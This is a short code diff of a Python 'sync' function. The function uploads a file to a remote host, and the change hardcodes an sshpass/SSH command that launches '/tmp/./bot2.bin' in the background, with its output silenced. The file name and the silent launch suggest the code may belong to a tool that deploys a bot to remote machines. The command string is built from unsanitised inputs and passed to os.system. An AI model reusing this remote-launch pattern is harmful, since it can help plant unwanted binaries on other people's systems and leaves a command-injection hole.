@@ -78,15 +78,17 @@ def sync(file, usr, pwd, port, source, ip, dst):
     if _exec["retcode"] == 0:
         print("{} succesfully uploaded @{}:{}".format(source, ip, dst))
         # execute command to install the bin @dst
-        rexec = 'sshpass -p {} ssh {}@{} -p {} "$(nohup /tmp/./{} > /dev/null 2>&1 &) && sleep 1 && exit"'.format(
+        # rexec = "sshpass -p {} ssh {}@{} -p {} '$(nohup /tmp/./bot2.bin > /dev/null 2>&1 &)'".format(
+        #     pwd.rstrip(), usr.rstrip(),
+        #     ip.rstrip(), port.rstrip())
+        os.system("sshpass -p {} ssh {}@{} -p {} '$(nohup /tmp/./bot2.bin > /dev/null 2>&1 &)'".format(
             pwd.rstrip(), usr.rstrip(),
-            ip.rstrip(), port.rstrip(),
-            file, file)
+            ip.rstrip(), port.rstrip()))
         # print(rexec)
-        if shell().execom(rexec)["retcode"] == 0:
-            print("{} sucessfully executed @{}".format(file.rstrip(), ip.rstrip()))
-        else:
-            print("failed to execute {} @{}".format(file.rstrip(), ip.rstrip()))
+        # if shell().execom(rexec)["retcode"] == 0:
+        #     print("{} sucessfully executed @{}".format(file.rstrip(), ip.rstrip()))
+        # else:
+        #     print("failed to execute {} @{}".format(file.rstrip(), ip.rstrip()))
 
     else:
         print("failed to load {} @ {}:{}".format(file, ip, {dst}))
